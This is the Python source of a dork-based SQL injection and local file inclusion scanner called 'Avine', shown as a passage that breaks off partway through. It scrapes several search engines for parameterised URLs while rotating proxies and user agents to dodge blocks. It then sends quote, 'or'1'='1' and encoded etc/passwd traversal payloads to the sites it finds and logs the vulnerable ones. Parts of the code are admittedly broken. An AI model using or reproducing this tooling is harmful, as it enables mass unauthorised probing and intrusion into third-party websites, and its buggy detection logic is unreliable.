from itertools import count
from operator import truediv
import os, time, ctypes, urllib3, requests, datetime, tkinter, threading, random, urllib.parse, re, subprocess, hmac, subprocess, hashlib, json, sys
from weakref import proxy
from colorama import init, Fore
from tkinter import filedialog
from bs4 import BeautifulSoup
root = tkinter.Tk()
root.withdraw()
dorklist = []
e = datetime.datetime.now()
current_date = e.strftime("%Y-%m-%d-%H-%M-%S")
filetypes = ( ('Text Files', '*.txt'), ('All Files', '.'))
hardwareid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
badlinks = [
'https://bing',
'https://wikipedia',
'https://stackoverflow',
'https://amazon',
'https://google',
'https://microsoft',
'https://youtube',
'https://reddit',
'https://quora',
'https://telegram',
'https://msdn',
'https://facebook',
'https://apple',
'https://twitter',
'https://instagram',
'https://cracked',
'https://nulled',
'https://yahoo',
'https://gbhackers',
'https://github',
'https://www.google',
'https://docs.microsoft',
'https://sourceforge',
'https://sourceforge.net',
'https://stackoverflow.com',
'https://www.facebook',
'https://www.bing', 
'https://www.bing.com', 
'https://www.bing.com/ck/a?!&&p=',
'https://bing',
'https://wikipedia',
'https://stackoverflow',
'https://amazon',
'https://google',
'https://microsoft',
'https://youtube',
'https://reddit',
'https://quora',
'https://telegram',
'https://msdn',
'https://facebook',
'https://apple',
'https://twitter',
'https://instagram',
'https://cracked',
'https://nulled',
'https://yahoo',
'https://gbhackers',
'https://github',
'https://www.google',
'https://docs.microsoft',
'https://sourceforge',
'https://sourceforge.net',
'https://stackoverflow.com',
'https://www.facebook',
'https://www.bing', 
'https://www.bing.com', 
'https://www.bing.com/ck/a?!&&p=',
'https://search.aol.com',
'https://search.aol',
'https://r.search.yahoo.com',
'https://r.search.yahoo',
'https://www.google.com',
'https://www.google',
'https://www.youtube.com',
'https://yabs.yandex.ru',
'https://www.ask.com',
'https://www.bing.com/search?q=',
'https://papago.naver.net',
'https://papago.naver'
] #filteres any likes with these in it
headerzz = [
{"Connection": "close", 'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:77.0) Gecko/20190101 Firefox/77.0'},
{"Connection": "close", 'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:77.0) Gecko/20100101 Firefox/77.0'},
{"Connection": "close", 'User-Agent' : 'Mozilla/5.0 (X11; Linux ppc64le; rv:75.0) Gecko/20100101 Firefox/75.0'},
{"Connection": "close", 'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/75.0'},
{"Connection": "close", 'User-Agent' : 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.10; rv:75.0) Gecko/20100101 Firefox/75.0'},
{"Connection": "close", 'User-Agent' : 'Mozilla/5.0 (X11; Linux; rv:74.0) Gecko/20100101 Firefox/74.0'},
{"Connection": "close", 'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/73.0'},
{"Connection": "close", 'User-Agent' : 'Mozilla/5.0 (X11; OpenBSD i386; rv:72.0) Gecko/20100101 Firefox/72.0'},
{"Connection": "close", 'User-Agent' : 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:71.0) Gecko/20100101 Firefox/71.0'},
{"Connection": "close", 'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:70.0) Gecko/20191022 Firefox/70.0'},
{"Connection": "close", 'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:70.0) Gecko/20190101 Firefox/70.0'},
{"Connection": "close", 'User-Agent' : 'Mozilla/5.0 (Windows; U; Windows NT 9.1; en-US; rv:12.9.1.11) Gecko/20100821 Firefox/70'},
{"Connection": "close", 'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:69.2.1) Gecko/20100101 Firefox/69.2'},
{"Connection": "close", 'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; rv:68.7) Gecko/20100101 Firefox/68.7'},
{"Connection": "close", 'User-Agent' : 'Mozilla/5.0 (X11; Linux i686; rv:64.0) Gecko/20100101 Firefox/64.0'},
{"Connection": "close", 'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582'},
{"Connection": "close", 'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19577'},
{"Connection": "close", 'User-Agent' : 'Mozilla/5.0 (X11) AppleWebKit/62.41 (KHTML, like Gecko) Edge/17.10859 Safari/452.6'},
{"Connection": "close", 'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931'},
{"Connection": "close", 'User-Agent' : 'Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393'},
{"Connection": "close", 'User-Agent' : 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.9200'},
{"Connection": "close", 'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586'},
{"Connection": "close", 'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246'},
{"Connection": "close", 'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36'},
{"Connection": "close", 'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36'},
{"Connection": "close", 'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36'},
{"Connection": "close", 'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36'},
{"Connection": "close", 'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36'}] #woah thats a lot of headers
headerz = [
{'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:77.0) Gecko/20190101 Firefox/77.0'},
{'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:77.0) Gecko/20100101 Firefox/77.0'},
{'User-Agent' : 'Mozilla/5.0 (X11; Linux ppc64le; rv:75.0) Gecko/20100101 Firefox/75.0'},
{'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/75.0'},
{'User-Agent' : 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.10; rv:75.0) Gecko/20100101 Firefox/75.0'},
{'User-Agent' : 'Mozilla/5.0 (X11; Linux; rv:74.0) Gecko/20100101 Firefox/74.0'},
{'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/73.0'},
{'User-Agent' : 'Mozilla/5.0 (X11; OpenBSD i386; rv:72.0) Gecko/20100101 Firefox/72.0'},
{'User-Agent' : 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:71.0) Gecko/20100101 Firefox/71.0'},
{'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:70.0) Gecko/20191022 Firefox/70.0'},
{'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:70.0) Gecko/20190101 Firefox/70.0'},
{'User-Agent' : 'Mozilla/5.0 (Windows; U; Windows NT 9.1; en-US; rv:12.9.1.11) Gecko/20100821 Firefox/70'},
{'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:69.2.1) Gecko/20100101 Firefox/69.2'},
{'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; rv:68.7) Gecko/20100101 Firefox/68.7'},
{'User-Agent' : 'Mozilla/5.0 (X11; Linux i686; rv:64.0) Gecko/20100101 Firefox/64.0'},
{'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582'},
{'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19577'},
{'User-Agent' : 'Mozilla/5.0 (X11) AppleWebKit/62.41 (KHTML, like Gecko) Edge/17.10859 Safari/452.6'},
{'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931'},
{'User-Agent' : 'Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393'},
{'User-Agent' : 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.9200'},
{'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586'},
{'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246'},
{'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36'},
{'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36'},
{'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36'},
{'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36'},
{'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36'}
] #wow even more headers
header = random.choice(headerz)
Results = [] 
GoodList = [] 
Total_Found = 0 
Valid = 0 
antipublic = 0 
Duplicates = 0 
Total = 0 
Error = 0
ProxyError = 0
proxylist = []
urllist = []
droklist = []
dorklina = []
dorkparse = 0
threadn = 0
counter = 0
dupe = 0
MySQL = 0
MsSQL = 0
PostGRES = 0
Oracle = 0
MariaDB = 0
Nonee = 0
Errorr = 0
sqls = 0
refresh = 0
linee = 0
badprox = 0
first = 0
askcount = 0
vulnerable = 0
nonvulnerable = 0
savepayload = "false"
lfi = 0
scan = 0
sqli = 0
invalidurl = 0
# this looks stupid
init()
blue, red, lightred, white, green, cyan, lightblue, reset, magenta, lightmagenta, lightcyan, yellow = Fore.BLUE, Fore.RED, Fore.LIGHTRED_EX, Fore.WHITE, Fore.GREEN, Fore.CYAN, Fore.LIGHTBLUE_EX, Fore.RESET, Fore.MAGENTA, Fore.LIGHTMAGENTA_EX, Fore.LIGHTCYAN_EX, Fore.YELLOW
#it took me forever to make this logo
logo = f'''     
        {cyan}╭───────────────────────────────────────────────────╮    
        {cyan}│  {lightcyan} ▄▀▀{cyan}█▄  {lightcyan} ▄▀▀{cyan}▄ {lightcyan}▄▀▀{cyan}▄  {lightcyan}▄{cyan}▀▀█▀{lightcyan}▄    ▄▀▀{cyan}▄ {lightcyan}▀{cyan}▄  {lightcyan}▄▀▀{cyan}█▄▄▄▄  {cyan}│
        {cyan}│  {lightcyan}▐ {cyan}▄▀ ▀▄ {lightcyan}█   {cyan}█    █ {lightcyan}█   {cyan}█  {lightcyan}█  █  {cyan}█ █ █{lightcyan} ▐  {cyan}█   {lightcyan}▐   {cyan}│
        {cyan}│  {cyan}  █▄▄▄█ {lightcyan}▐ {cyan} █    █  {lightcyan}▐   {cyan}█ {lightcyan} ▐  ▐ {cyan} █  ▀█   █▄▄▄▄▄   {cyan}│
        {cyan}│  {lightcyan} ▄{cyan}▀   █    █   ▄▀      █       █   █    █    ▌   {cyan}│
        {cyan}│  {lightcyan}█   ▄▀      {cyan}▀▄▀     {lightcyan}▄{cyan}▀▀▀▀▀{lightcyan}▄  ▄▀   █    ▄{cyan}▀▄▄▄▄    {cyan}│
        {cyan}│  {lightcyan}▐   ▐              █       █ █    ▐    █    ▐    {cyan}│
        {cyan}│  {lightcyan}                  ▐       ▐ ▐         ▐          {cyan}│
        {cyan}╰───────────────────────────────────────────┨{magenta}AVINE{cyan}┠─╯'''
    
def sql(link): #this works
    global MySQL, MsSQL, PostGRES, Oracle, MariaDB, Nonee, Errorr, sqls
    check = "'"
    try:
        checker = requests.post(link + check)
        if "MySQL" in checker.text:
            MySQL+=1
            sqls+=1
        elif "native client" in checker.text:
            MsSQL+=1
            sqls+=1
        elif "syntax error" in checker.text:
            PostGRES+=1
            sqls+=1
        elif "ORA" in checker.text:
            Oracle+=1
            sqls+=1
        elif "MariaDB" in checker.text:
            MariaDB+=1
            sqls+=1
        elif "You have an error in your SQL syntax;" in checker.text:
            sqls+=1
            Nonee+=1
    except:
        Errorr+=1

def lfiscan(): #never finished this lmfao
    global lfi_win, nonvulnerable, lfi, scan, Errorr, counter, linee
    counter+=1
    scan+=1
    if scan < len(urllist):
        linee+=1
        with open(fileNameUrl.name, 'r+', encoding='utf-8', errors='ignore') as e:
            ext = e.readlines()
            url = ext[int(linee)].strip()
        ctypes.windll.kernel32.SetConsoleTitleW(f"Avine By KillinMachine#2570  |  LFI Vulnerability Scanner {scan}/{len(urllist)}  |  Vulnerable Urls: {lfi}  |  Errors: {Errorr}")
        if counter > 30:
            os.system('cls')
            print(logo)
            print()
            print(f"{magenta}    Scanning Your Urls For LFI Vulnerabilities!")
            print(f"  {lightblue}Progress: {yellow}[{cyan}{scan}/{len(urllist)}{yellow}]{reset}")
            print(f"  {lightblue}Vulnerable: {yellow}[{cyan}{lfi}{yellow}]{reset}")
            print(f"  {lightblue}Errors: {yellow}[{cyan}{Errorr}{yellow}]{reset}")
            print(f"  {lightblue}Url: {yellow}[{cyan}{url}{yellow}]{reset}")
            counter = 0
        try: 
            lfiscanner(url)
        except:
            Errorr+=1
        threading.Thread(target=lfiscan, args=()).start()
    if scan == len(urllist):
        print(logo)
        print()
        print(f"{magenta}   Scanning Finished!")
        print()
        print(f"{lightblue}Vulnerable Urls: {yellow}[{cyan}{lfi}{yellow}]{reset}")
        time.sleep(3)
        main2()
        
def lfiscanner(url): #again dont work never finished working on it
    global lfi_win, nonvulnerable, lfi, Errorr
    dot_list = []
    slash_list = []
    lfi_win = []
    pre_dot_list = ['..', '..%00', '%2e%2e', '%5C..', '.%2e', '%2e.', '%c0%6e%c0%6e', '%252e%252e', '%c0%2e%c0%2e', '%c0%5e%c0%5e', '%%32%%65%%32%%65', '%e0%90%ae%e0%90%ae', '%25c0%25ae%25c0%25ae', '%f0%80%80%ae%f0%80%80%ae', '%fc%80%80%80%80%ae%fc%80%80%80%80%ae']
    pre_slash_list = ['/', '\\', '%2f', '%5c', '%252f', '%255c', '%c0%2f', '%c0%af', '%c0%5c', '%c1%9c', '%c1%af', '%c1%8s', '%bg%qf', '%u2215', '%u2216', '%uEFC8', '%%32%%66', '%%35%%63', '%25c1%259c', '%25c0%25af', '%f8%80%80%80%af', '%f0%80%80%af']
    for i in range(len(pre_dot_list)):
        dot_list.append(pre_dot_list[i].strip())
    for i in range(len(pre_slash_list)):
        slash_list.append(pre_slash_list[i].strip())
    goal = r"etc/passwd"
    succeed = 0 
    for dot in dot_list:
        if succeed == 1:
            break
        for slash in slash_list:
            if succeed == 1:
                break
            for i in range(1, 5):
                if succeed == 1:
                    break
                if i == 1:
                    payload = dot+slash+goal
                if i == 2:
                    payload = dot+slash+dot+slash+goal
                if i == 3:
                    payload = dot+slash+dot+slash+dot+slash+goal
                if i == 4:
                    payload = dot+slash+dot+slash+dot+slash+dot+slash+goal
                if i == 5:
                    payload = dot+slash+dot+slash+dot+slash+dot+slash+dot+slash+goal
                check = requests.get(url+payload)
                if ("root:") in check.text:
                    succeed = 1
                    win_payload = payload
                    lfi+=1
                    lfi_win.append(win_payload)
                    with open(r'results/lfi.txt', 'a') as File:
                        if savepayload == "true":
                            File.write(url) + File.write(f"  |  {win_payload}") + File.write('\n')
                        if savepayload == "false":
                            File.write(url) + File.write('\n')
                    break
                else:
                    nonvulnerable+=1
            
def vulnscan(): #broken asf i got distracted while working on this f
    global vulnerable, nonvulnerable, savepayload, scan, Errorr, counter, linee, invalidurl
    scan+=1
    counter+=1
    if scan < len(urllist):
        linee+=1
        with open(fileNameUrl.name, 'r+', encoding='utf-8', errors='ignore') as e:
            ext = e.readlines()
            url = ext[int(linee)].strip()
        ctypes.windll.kernel32.SetConsoleTitleW(f"Avine By KillinMachine#2570  |  SQLI Vulnerability Scanner {scan}/{len(urllist)}  |  Vulnerable Urls: {vulnerable}  |  Invalid Url's: {invalidurl}  |  Errors: {Errorr}")
        if counter > 2:
            os.system('cls')
            print(logo)
            print()
            print(f"{magenta}    Scanning Your Urls For SQLI Vulnerabilities!")
            print(f"  {lightblue}Progress: {yellow}[{cyan}{scan}/{len(urllist)}{yellow}]{reset}")
            print(f"  {lightblue}Vulnerable: {yellow}[{cyan}{vulnerable}{yellow}]{reset}")
            print(f"  {lightblue}Errors: {yellow}[{cyan}{Errorr}{yellow}]{reset}")
            print(f"  {lightblue}Url: {yellow}[{cyan}{url}{yellow}]{reset}")
            counter = 0
        try:
            sqliscanner(url)
        except Exception as r:
            Errorr+=1
            print(r)
            time.sleep(2)
        threading.Thread(target=vulnscan, args=()).start()
    if scan == len(urllist):
        print(logo)
        print()
        print(f"{magenta}   Scanning Finished!")
        print()
        print(f"{lightblue}Vulnerable Urls: {yellow}[{cyan}{vulnerable}{yellow}]{reset}")
        time.sleep(3)
        main2()

def sqliscanner(url): #never finished
    global vulnerable, nonvulnerable, savepayload, invalidurl, scan
    try:
        f = url.split('=')[0]
        r = url.split('=')[1]
        eq = '='
        payloads = ["'", '"', "`", "/'/", "'||'asd'||'", "'or'1'='1", "+or+1=1", "'or''='", ')', "')"]
        error_list = ["You have an error in your SQL syntax","error in your SQL syntax","mysql_numrows()","Input String was not in a correct format","mysql_fetch","num_rows","Error Executing Database Query","Unclosed quotation mark","Error Occured While Processing Request","Server Error","Microsoft OLE DB Provider for ODBC Drivers Error","Invalid Querystring","VBScript Runtime","Syntax Error","GetArray()","FetchRows()","executeQuery","mysql_fetch_array()"]
        for payload in payloads:
            pattern = r"http\S+"
            query = f + eq + r + payload 
            try:
                content = requests.get(url).text
                content_urless = re.sub(pattern, "", content)
                new_content = requests.get(query).text
                new_content_urless = re.sub(pattern, "", new_content)
                if content_urless != new_content_urless and str(error_list) not in new_content_urless:
                    nonvulnerable+=1
                elif str(error_list) in new_content_urless:
                    vulnerable+=1
                    scan+=1
                    with open(r'results/sqli.txt', 'a') as File:
                        if savepayload == "true":
                            File.write(url) + File.write(f"  |  {payload}") + File.write('\n')
                        if savepayload == "false":
                            File.write(url) + File.write('\n')
                else:
                    nonvulnerable+=1
                    scan+=1
            except:
                invalidurl+=1
                scan+=1
    except:
        invalidurl+=1
        scan+=1
            
def proxy(): #proxies like are so slow unless u got good ones so yea
    global ProxyError, proxies
    if proxytype == "https":
        try:
            RandomProxy = random.choice(proxylist)
            proxy = RandomProxy.split(':')
            if len(proxy) == 2:
                proxies = {'https': f'https://{RandomProxy}','http': f'http://{RandomProxy}'}
            elif len(proxy) == 4:
                proxies = {'https': f'https://{proxy[2]}:{proxy[3]}@{proxy[0]}:{proxy[1]}','http': f'http://{proxy[2]}:{proxy[3]}@{proxy[0]}:{proxy[1]}'}
            else:
                proxylist.remove(RandomProxy)
        except:
            ProxyError+=1
    if proxytype == "socks4":
        try:
            RandomProxy = random.choice(proxylist)
            proxy = RandomProxy.split(':')
            if len(proxy) == 2:
                proxies = {'https': f'socks4://{RandomProxy}','http': f'socks4://{RandomProxy}'}
            elif len(proxy) == 4:
                proxies = {'https': f'socks4://{proxy[2]}:{proxy[3]}@{proxy[0]}:{proxy[1]}','http': f'socks4://{proxy[2]}:{proxy[3]}@{proxy[0]}:{proxy[1]}'}
            else:
                proxylist.remove(RandomProxy)
        except:
            ProxyError+=1
    if proxytype == "socks5":
        try:
            RandomProxy = random.choice(proxylist)
            proxy = RandomProxy.split(':')
            if len(proxy) == 2:
                proxies = {'https': f'socks5://{RandomProxy}','http': f'socks5://{RandomProxy}'}
            elif len(proxy) == 4:
                proxies = {'https': f'socks5://{proxy[2]}:{proxy[3]}@{proxy[0]}:{proxy[1]}','http': f'socks5://{proxy[2]}:{proxy[3]}@{proxy[0]}:{proxy[1]}'}
            else:
                proxylist.remove(RandomProxy)
        except:
            ProxyError+=1
            
def parse(): #bossman part of the code
    global Total_Found, Valid, Duplicates, Error, dorklina, ProxyError, Total, dorkparse, threadn, counter, dupe, refresh, engine, searchengine, badprox, first, askcount
    if Total < dorklineint:
            try:
                ctypes.windll.kernel32.SetConsoleTitleW(f"Avine By KillinMachine#2570  |  Parsed dorks = {Total}  |  Total Found Links = {Total_Found}  |  Duplicates = {Duplicates}  |  Valid Links = {Valid} |  Retries = {ProxyError}  |  Error = {Error}")
                counter+=1
                dorkparse+=1
                refresh+=1
                if dorkparse == 10:
                    if threadn < 1:
                        askcount = 0
                        first = 0
                        dorkparse = 0
                        badprox = 0
                        Drok()
                        Total += 1
                    if dupe == 10:
                        if threadn//dupe < 15:
                            askcount = 0
                            dupe = 0
                            first = 0
                            dorkparse = 0
                            badprox = 0
                            Drok()
                            Total += 1
                    if counter > 50:
                        askcount = 0
                        counter = 0
                        dorkparse = 0
                        badprox = 0
                        first = 0
                        Drok()
                        Total += 1
                    threadn = 0
                    dorkparse = 0
                if counter == 4: #weird code right here but it fixed something at one point and idk if i even needed to do this idk its stupid
                    searchengine = engine
                    os.system('cls')
                    ctypes.windll.kernel32.SetConsoleTitleW(f"Avine By KillinMachine#2570  |  Parsed dorks = {Total}  |  Total Found Links = {Total_Found}  |  Duplicates = {Duplicates}  |  Valid Links = {Valid} |  Retries = {ProxyError}  |  Error = {Error}")
                    print(logo)
                    print() #lmfao this the ui part
                    print(f'''{magenta}     Parsing Dorks!{reset}
  {lightblue}Search Engine: {yellow}[{cyan}{searchengine}{yellow}]{reset}
  {lightblue}File: {yellow}[{cyan}{fileNameDork.name}{yellow}]{reset}
  {lightblue}Dork: {yellow}[{cyan}{dorklia}{yellow}]{reset}
  {lightblue}Parsed Dork's: {yellow}[{cyan}{Total}{yellow}/{cyan}{dorklineint}{yellow}]{reset}''')
                    try:
                        print(f"  {lightblue}Total Ratio: {yellow}[{cyan}1{yellow}:{cyan}{Total_Found//Total}{yellow}]{reset}")
                    except:
                        pass
                    try:
                        print(f"  {lightblue}Valid Ratio: {yellow}[{cyan}1{yellow}:{cyan}{Total_Found//Valid}{yellow}]{reset}")
                    except:
                        pass
                    print(f'''  {lightblue}Total Link's: {yellow}[{cyan}{Total_Found}{yellow}]{reset} 
  {lightblue}Duplicates: {yellow}[{cyan}{Duplicates}{yellow}]{reset}
  {lightblue}Valid Link's: {yellow}[{cyan}{Valid}{yellow}]{reset}
  {lightblue}Retries: {yellow}[{cyan}{ProxyError}{yellow}]{reset}
  {lightblue}Error's: {yellow}[{cyan}{Error}{yellow}]{reset}
  
  {magenta}    SQL Links!{reset}
  {lightblue}MySQL: {yellow}[{cyan}{MySQL}{yellow}]{reset}
  {lightblue}MSSQL: {yellow}[{cyan}{MsSQL}{yellow}]{reset}
  {lightblue}PostGRES: {yellow}[{cyan}{PostGRES}{yellow}]{reset}
  {lightblue}Oracle: {yellow}[{cyan}{Oracle}{yellow}]{reset}
  {lightblue}MariaDB: {yellow}[{cyan}{MariaDB}{yellow}]{reset}
  {lightblue}None: {yellow}[{cyan}{Nonee}{yellow}]{reset}
  {lightblue}Error's: {yellow}[{cyan}{Errorr}{yellow}]{reset}''')
                    refresh = 0
                proxy()
                if engine == "Bing":
                    header = random.choice(headerz)
                    first+=1
                    url = f"https://www.bing.com/search?q={urllib.parse.quote(dorklia)}&first={first}"
                    try:
                        if proxytype != "Proxyless":
                            response_2 = requests.get(url, headers=header, proxies=proxies, timeout=10)
                        else:
                            response_2 = requests.get(url, headers=header, timeout=10)
                        soup = BeautifulSoup(response_2.text, 'html.parser')
                        TagList = soup.find_all('h2')
                        for tag in TagList:
                            Body = tag.find_all('a')
                            for Container in Body:
                                link = Container['href']
                                try: 
                                    link1 = link.split("/")[2]
                                except: 
                                    pass
                                if "www.bing.com" in link1:
                                    r = requests.get(link)
                                    link = r.url
                                    try: 
                                        link1 = link.split("/")[2] #tryna get fix the redirect link that bing gives should also do this for yahoo if ya want links
                                    except: 
                                        pass
                                    if "www.bing.com" in link1:
                                        r = requests.get(link)
                                        link = r.url
                                    else:
                                        pass
                                else:
                                    pass
                                refresh+=1
                                Total_Found += 1
                                threadn+=1
                                if link not in Results:
                                    dupe+=1
                                    Duplicates = Total_Found - Valid
                                    Results.append(link)
                                    linkhost = link.split('.com')[0]
                                    if linkhost not in badlinks:
                                        dupe = 0
                                        counter = 0
                                        if "=" in link:
                                            Valid += 1
                                            badlinks.append(link)
                                            with open(r'results/bing_links.txt', 'a') as File:
                                                File.write(link) + File.write('\n')
                                            sql(link)
                    except:
                        ProxyError += 1
                        dorkparse = 0
                if engine == "Google": #yea dont work
                    header = random.choice(headerzz)
                    first+=1
                    url = f"https://www.google.com/search?q={urllib.parse.quote(dorklia)}&start={first*10}"
                    try:
                        if proxytype != "Proxyless":
                            response_2 = requests.get(url, headers=header, proxies=proxies, timeout=10)
                        else:
                            response_2 = requests.get(url, headers=header, timeout=10)
                        soup = BeautifulSoup(response_2.text, 'html.parser')
                        for d in soup.find_all("div", class_="yuRUbf"):
                            for a in d.find_all('a'):
                                badprox = 0
                                link = a['href']
                                Total_Found += 1
                                threadn+=1
                                if link not in Results:
                                    dupe+=1
                                    Duplicates = Total_Found - Valid
                                    Results.append(link)
                                    linkhost = link.split('.com')[0]
                                    if linkhost not in badlinks:
                                        dupe = 0
                                        counter = 0
                                        if '=' in link:
                                            Valid += 1
                                            badlinks.append(link)
                                            with open(r'results/google_links.txt', 'a') as File:
                                                File.write(link) + File.write('\n')
                                            sql(link)
                    except:
                        ProxyError+=1
                        dorkparse = 0
                if engine == "Yahoo":
                    header = random.choice(headerzz)
                    first+=1
                    url = f"https://search.yahoo.com/search?p={urllib.parse.quote(dorklia)}&b={first*10}"
                    try:
                        if proxytype != "Proxyless":
                            response_2 = requests.get(url, headers=header, proxies=proxies, timeout=10)
                        else:
                            response_2 = requests.get(url, headers=header, timeout=10)
                        soup = BeautifulSoup(response_2.text, 'html.parser')
                        for d in soup.find_all('h3', class_="title"):
                            for a in d.find_all('a'):
                                badprox = 0
                                link = a['href']
                                Total_Found += 1
                                threadn+=1
                                if link not in Results:
                                    dupe+=1
                                    Duplicates = Total_Found - Valid
                                    Results.append(link)
                                    linkhost = link.split('.com')[0]
                                    if linkhost not in badlinks:
                                        dupe = 0
                                        counter = 0
                                        if '=' in link:
                                            Valid += 1
                                            badlinks.append(link)
                                            with open(r'results/yahoo_links.txt', 'a') as File:
                                                File.write(link) + File.write('\n')
                                            sql(link)
                    except:
                        ProxyError+=1
                        dorkparse = 0
                if engine == "Ask":
                    header = random.choice(headerz)
                    askcount+=1
                    if askcount == 20:
                        first+=1
                        askcount = 0
                    url = f"https://www.ask.com/web?q={urllib.parse.quote(dorklia)}&page={first}"
                    try:
                        if proxytype != "Proxyless":
                            response_2 = requests.get(url, headers=header, proxies=proxies, timeout=10)
                        else:
                            response_2 = requests.get(url, headers=header, timeout=10)
                        soup = BeautifulSoup(response_2.text, 'html.parser')
                        TagList = soup.find_all("div", class_="PartialSearchResults-item-title")
                        for tag in TagList:
                            Body = tag.find_all('a')
                            for Container in Body:
                                badprox = 0
                                link = Container['href']
                                Total_Found += 1
                                threadn+=1
                                if link not in Results:
                                    dupe+=1
                                    Duplicates = Total_Found - Valid
                                    Results.append(link)
                                    linkhost = link.split('.com')[0]
                                    if linkhost not in badlinks:
                                        dupe = 0
                                        counter = 0
                                        if '=' in link:
                                            Valid += 1
                                            badlinks.append(link)
                                            with open(r'results/ask_links.txt', 'a') as File:
                                                File.write(link) + File.write('\n')
                                            sql(link)
                    except:
                        ProxyError+=1 
                        dorkparse = 0
                if engine == "Rambler":
                    header = random.choice(headerz)
                    first+=1
                    url = f"https://nova.rambler.ru/search?utm_source=head&utm_campaign=self_promo&utm_medium=form&utm_content=search&query={urllib.parse.quote(dorklia)}&page={first}"
                    try:
                        if proxytype != "Proxyless":
                            response_2 = requests.get(url, headers=header, proxies=proxies, timeout=10)
                        else:
                            response_2 = requests.get(url, headers=header, timeout=10)
                        soup = BeautifulSoup(response_2.text, 'html.parser')
                        TagList = soup.find_all('h3', class_="Serp__title--3MDnI")
